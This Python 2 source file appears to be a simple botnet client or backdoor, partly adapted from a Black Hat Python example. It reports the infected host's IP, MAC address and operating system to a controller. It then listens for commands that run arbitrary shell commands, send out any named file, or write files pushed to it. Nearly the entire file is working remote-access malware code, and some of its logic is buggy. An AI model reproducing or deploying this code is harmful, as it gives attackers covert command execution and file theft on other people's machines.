import socket
import threading
import platform
from uuid import getnode as get_mac
import subprocess

# ---------- BOT INIT ---------- #
send_host = '127.0.0.1'
send_port = 9990

bind_host = '127.0.0.1'
bind_port = 6660

ip = socket.gethostbyname(socket.gethostname())
mac = hex(get_mac())
os = platform.platform()

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the client
client.connect((send_host, send_port))

client.send('[*-->online')
if client.recv(1024) == '[*-->ok':
    client.send(ip)
    client.send(mac)
    client.send(os)

# ---------- END BOT INIT ---------- #


def execute_cmd(the_client):
    the_client.send('[*-->ok')

    cmd = the_client.recv(1024)
    op = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    if op:
        the_client.send('[*-->success')
        output = str(op.stdout.read())
        print "Output:", output
        client.sendall(output)
    else:
        the_client.send('[*-->failure')
        error = str(op.stderr.read())
        print "Error:", error
        client.sendall(error)


def send_file(the_client):
    the_client.send('[*-->ok')

    name = the_client.recv(1024)
    the_client.send('[*-->ok')

    if the_client.recv(1024) == '[*-->start':
        the_file = open(name, 'rb')
        file_stream = the_file.read(1024)

        while file_stream:
            print('Sending...')
            the_client.send(file_stream)
            file_stream = the_file.read(1024)

    the_client.shutdown(socket.SHUT_WR)
    the_client.close()


def get_file(the_client):
    the_client.send('[*-->ok')

    name = the_client.recv(1024)
    the_file = open(name, 'wb')
    the_client.send('[*-->ok')

    print ("Receiving")
    file_stream = the_client.recv(1024)

    while file_stream:
        print ("Receiving...")
        the_file.write(file_stream)
        file_stream = the_client.recv(1024)

    print('File Get')


def run_scan():
    print('scanning')


# ---------- TCP Server ---------- #
# Code example from Black Hat Python, written by Justin Seitz and published by No Starch Press
# TCP server to accept messages from bot, runs as a thread

# Create the socket to listen on for TCP, set the IP and port (0.0.0.0 means any I think?)
# 5 is max backlogged connections
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_host, bind_port))
server.listen(10)


def handle_client(client_socket):
    # Handles a client when the connect, called by the server, async

    request = client_socket.recv(1024)  # 1024 is the buffer size

    print("\n%s" % request)
    if request == '[*-->file_recv':
        get_file(client_socket)

    if request == '[*-->file_deliv':
        send_file(client_socket)

    if request == '[*-->cmd':
        execute_cmd(client_socket)

    if request == '[*-->scan':
        run_scan()

    client_socket.close()


# This function starts the actual server
while True:
    client, addr = server.accept()
    print('\n[*--> Accepted connection from %s:%d' % (addr[0], addr[1]))

    # Client thread handling for incoming data
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()

# ---------- END OF SERVER ---------- #



